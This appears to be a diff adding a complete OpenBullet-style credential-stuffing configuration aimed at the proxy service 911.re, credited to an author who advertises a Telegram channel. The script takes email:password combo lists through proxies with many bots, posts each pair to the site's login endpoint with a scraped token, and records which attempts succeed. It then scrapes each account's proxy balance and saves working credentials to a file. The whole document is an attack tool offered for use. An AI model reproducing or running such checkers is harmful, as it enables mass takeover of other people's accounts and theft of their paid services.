@@ -1,0 +1,100 @@
+[SETTINGS]
+{
+  "Name": "911.RE",
+  "SuggestedBots": 150,
+  "MaxCPM": 0,
+  "LastModified": "2020-10-16T22:50:38.3974644+03:00",
+  "AdditionalInfo": "Join US T.me/ghoulblack",
+  "Author": "👑LilTOBA👑",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "Config BY LilTOBA :)",
+      "VariableName": "",
+      "Id": 1444713001
+    },
+    {
+      "Description": "Join US T.me/ghoulblack",
+      "VariableName": "",
+      "Id": 651168734
+    }
+  ],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "http://911.re/" 
+  
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+
+#TOKEN PARSE "<SOURCE>" LR "id=\"login_token\" type=\"hidden\" value=\"" "\"" -> VAR "TOKEN" 
+
+REQUEST POST "http://911.re/userpanel" 
+  CONTENT "action=userlogin&login_token=<TOKEN>&login_user=<USER>&login_pwd=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "false" 
+  KEYCHAIN Success OR 
+    KEY "true" 
+
+REQUEST GET "http://911.re/user" 
+  
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+
+#PROXIES PARSE "<SOURCE>" LR "Account Balance:&nbsp;<span>" "</span" -> CAP "PROXIES" 
+
+KEYCHECK 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "0 proxies" 
+
+FUNCTION Constant "LilTOBA" -> CAP "Config BY" 
+
+UTILITY File "911.txt" AppendLines "<USER>:<PASS>|Config BY LilTOBA|Join US T.me/ghoulblack|" 
+
